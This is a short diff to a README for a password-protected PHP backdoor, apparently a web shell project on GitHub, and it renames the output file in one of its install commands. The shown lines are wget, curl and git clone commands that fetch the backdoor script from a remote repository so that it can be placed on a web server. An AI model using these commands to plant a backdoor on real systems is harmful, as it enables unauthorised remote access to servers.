@@ -10,7 +10,7 @@ This is a simple backdoor protected with a password written in PHP. You can chan
 wget https://raw.githubusercontent.com/NullBrunk/WebShell/main/backdoor.php  
 ```
 ```bash
-curl -so PhpBindShell.php https://raw.githubusercontent.com/NullBrunk/WebShell/main/backdoor.php 
+curl -so backdoor.php https://raw.githubusercontent.com/NullBrunk/WebShell/main/backdoor.php 
 ```
 ```bash
 git clone https://github.com/NullBrunk/WebShell.git && mv WebShell/backdoor.php ./ && rm -rf WebShell/
